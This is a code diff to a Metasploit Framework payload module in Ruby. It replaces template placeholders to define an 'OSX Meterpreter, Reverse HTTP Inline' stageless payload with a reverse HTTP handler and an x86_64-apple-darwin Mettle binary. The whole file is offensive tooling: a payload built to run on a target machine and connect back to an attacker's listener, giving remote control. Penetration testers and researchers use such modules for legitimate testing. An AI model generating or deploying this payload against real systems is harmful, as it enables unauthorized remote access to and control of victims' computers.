@@ -3,12 +3,14 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core/handler/reverse_<%= scheme %>'
+require 'msf/core/handler/reverse_http'
 require 'msf/base/sessions/meterpreter_options'
 require 'msf/base/sessions/mettle_config'
-require 'msf/base/sessions/meterpreter_<%= arch %>_linux'
+require 'msf/base/sessions/meterpreter_x64_osx'
 
 module MetasploitModule
+
+  CachedSize = 618316
 
   include Msf::Payload::Single
   include Msf::Sessions::MeterpreterOptions
@@ -18,23 +20,26 @@ module MetasploitModule
     super(
       update_info(
         info,
-        'Name'          => 'Linux Meterpreter, Reverse <%= scheme.upcase %> Inline',
+        'Name'          => 'OSX Meterpreter, Reverse HTTP Inline',
         'Description'   => 'Run the Meterpreter / Mettle server payload (stageless)',
         'Author'        => [
           'Adam Cammack <adam_cammack[at]rapid7.com>',
           'Brent Cook <brent_cook[at]rapid7.com>'
         ],
-        'Platform'      => 'linux',
-        'Arch'          => ARCH_<%= arch.upcase %>,
+        'Platform'      => 'osx',
+        'Arch'          => ARCH_X64,
         'License'       => MSF_LICENSE,
-        'Handler'       => Msf::Handler::Reverse<%= scheme.capitalize %>,
-        'Session'       => Msf::Sessions::Meterpreter_<%= arch %>_Linux
+        'Handler'       => Msf::Handler::ReverseHttp,
+        'Session'       => Msf::Sessions::Meterpreter_x64_OSX
       )
     )
   end
 
   def generate
-    opts = {scheme: '<%= scheme %>'}
-    MetasploitPayloads::Mettle.new('<%= payload %>', generate_config(opts)).to_binary :exec
+    opts = {
+      scheme: 'http',
+      stageless: true
+    }
+    MetasploitPayloads::Mettle.new('x86_64-apple-darwin', generate_config(opts)).to_binary :exec
   end
 end
